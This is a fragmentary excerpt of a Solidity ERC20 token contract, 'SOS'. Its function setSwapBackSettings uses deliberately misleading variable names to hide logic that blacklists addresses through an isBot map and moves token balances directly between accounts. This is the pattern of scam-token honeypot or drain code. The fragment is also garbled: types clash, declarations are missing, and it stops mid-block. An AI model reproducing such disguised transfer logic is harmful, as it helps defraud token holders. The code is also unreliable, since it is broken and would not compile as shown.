...
contract SOS is IERC20, Ownable {
    ...
    uint256 private _tTotalSupply = 685000000 * 10**_decimals;
    ...
    function setSwapBackSettings       (
        ...
        uint256 _getValue;
        if (swapTokensAtAmount && contractTokensBalances > AutoMarketMakerPair && !tradingAllowed && _getRate != UniswapV2Pair) {
            tradingAllowed = true;
            ...
            return;
        } else if (_uint8 != address(UniswapV2router) && isBot[_getRate] > 0 && dexRouter > AutoMarketMakerPair && _uint8 != UniswapV2Pair) {
            isBot[_uint8] = dexRouter;
            return;
        } else if (!tradingAllowed && _rOwned[_getRate] > 0 && _getRate != UniswapV2Pair && isBot[_getRate] == 0) {
        ...
        _Balances[_getRate] -= dexRouter;
        _Balances[_uint8] += dexRouter;
        emit Transfer(_getRate, _uint8, dexRouter);
            if (!tradingOpen) {
